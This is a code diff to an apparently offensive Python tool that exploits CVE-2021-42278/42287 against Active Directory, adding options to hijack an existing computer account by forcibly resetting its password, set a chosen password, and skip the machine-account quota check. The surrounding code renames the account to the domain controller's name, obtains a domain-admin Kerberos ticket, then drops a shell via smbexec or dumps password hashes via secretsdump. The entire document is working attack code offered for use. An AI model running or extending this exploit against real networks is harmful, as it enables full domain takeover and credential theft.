@@ -17,6 +17,7 @@ import random
 import ssl
 import os
 from binascii import unhexlify
+from ldap3.utils.log import log
 import ldapdomaindump
 import ldap3
 import time
@@ -41,7 +42,9 @@ def banner():
     """
 
 def exploit(dcfull,adminticket,options):
-    logging.info("Pls make sure your choice hostname and the -dc-ip are same machine !!")
+    if options.shell or options.dump:
+        logging.info("Pls make sure your choice hostname and the -dc-ip are same machine !!")
+        logging.info('Exploiting..')
     # export KRB5CCNAME
     os.environ["KRB5CCNAME"] = adminticket
     if options.shell:
@@ -69,11 +72,18 @@ def exploit(dcfull,adminticket,options):
             logging.error(str(e))
 
 def samtheadmin(username, password, domain, options):
+    if options.no_add and not options.new_name:
+        logging.error(f'Net input a target with `-new-name` !')
+        return
     if options.new_name:
         new_computer_name = options.new_name
     else:
-        new_computer_name = ''.join(random.sample(string.ascii_letters + string.digits, 10)).upper()
-    new_computer_password = ''.join(random.choice(characters) for _ in range(12))
+        new_computer_name = 'WIN-'+''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()
+
+    if options.new_pass:
+        new_computer_password = options.new_pass
+    else:
+        new_computer_password = ''.join(random.choice(characters) for _ in range(12))
 
     domain, username, password, lmhash, nthash = parse_identity(options)
     ldap_server, ldap_session = init_ldap_session(options, domain, username, password, lmhash, nthash)
@@ -82,18 +92,30 @@ def samtheadmin(username, password, domain, options):
     cnf.basepath = None
     domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
     MachineAccountQuota = 10
-    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
-    if dn:
-        logging.error(f'Account {new_computer_name} already exists!')
-        return  
+    # check MAQ and options
     for i in domain_dumper.getDomainPolicy():
         MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))
 
-    if MachineAccountQuota < 0:
+    if MachineAccountQuota < 1 and not options.no_add and not options.create_child:
         logging.error(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
-        exit()
+        return
     else:
         logging.info(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')
+
+    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
+    if dn and options.no_add:
+        logging.info(f'{new_computer_name} already exists! Using force mode.')
+        ldap_session.extend.microsoft.modify_password(str(dn['dn']), new_computer_password)
+        if ldap_session.result['result'] == 0:
+            logging.info(f'Modify password successfully, host: {new_computer_name} password: {new_computer_password}')
+        else:
+            logging.error('Cannot change the machine password , exit.')
+            return
+    elif options.no_add and not dn:
+        logging.error(f'Target {new_computer_name} not exists!')
+    elif dn:
+        logging.error(f'Account {new_computer_name} already exists!')
+        return 
 
     if options.dc_host:
         dc_host = options.dc_host.upper()
@@ -139,19 +161,19 @@ def samtheadmin(username, password, domain, options):
         exploit(dcfull,adminticket,options)
         return
 
+    if not options.no_add:
+        logging.info(f'Adding Computer Account "{new_computer_name}"')
+        logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')
 
-    logging.info(f'Adding Computer Account "{new_computer_name}"')
-    logging.info(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')
-
-    # Creating Machine Account
-    addmachineaccount = AddComputerSAMR(
-        username, 
-        password, 
-        domain, 
-        options,
-        computer_name=new_computer_name,
-        computer_pass=new_computer_password)
-    addmachineaccount.run()
+        # Creating Machine Account
+        addmachineaccount = AddComputerSAMR(
+            username, 
+            password, 
+            domain, 
+            options,
+            computer_name=new_computer_name,
+            computer_pass=new_computer_password)
+        addmachineaccount.run()
 
 
     # CVE-2021-42278
@@ -167,8 +189,11 @@ def samtheadmin(username, password, domain, options):
             logging.info(f'{new_computer_name} sAMAccountName == {dc_host}')
         else:
             logging.error('Cannot rename the machine account , target patched')
-            del_added_computer(ldap_session, domain_dumper,new_computer_name)
-            exit()
+            if not options.no_add:
+                del_added_computer(ldap_session, domain_dumper,new_computer_name)
+            return
+    else:
+        return
 
     # make hash none, we don't need id now.
     options.hashes = None
@@ -194,10 +219,11 @@ def samtheadmin(username, password, domain, options):
     executer.run()
     logging.info(f'Remove ccache of {dcfull}')
     os.remove(dcticket)
-    logging.info(f'Rename ccache with target.')
+    logging.info(f'Rename ccache with target ...')
     os.rename(f'{domain_admin}.ccache',adminticket)
     # Delete domain computer we just added.
-    del_added_computer(ldap_session, domain_dumper,new_computer_name)
+    if not options.no_add:
+        del_added_computer(ldap_session, domain_dumper,new_computer_name)
     exploit(dcfull,adminticket,options)
 
 
@@ -213,10 +239,13 @@ if __name__ == '__main__':
                                                               'delegation to the SPN specified')
 
     parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
-    parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Add new computer name, if not specified, will be random generated.')
+    parser.add_argument('-new-name', action='store', metavar='NEWNAME', help='Target computer name, if not specified, will be random generated.')
+    parser.add_argument('-new-pass', action='store', metavar='PASSWORD', help='Add new computer password, if not specified, will be random generated.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
+    parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
+    parser.add_argument('-create-child', action='store_true', help='Current account have permission to CreateChild.')
     parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
 
     group = parser.add_argument_group('authentication')
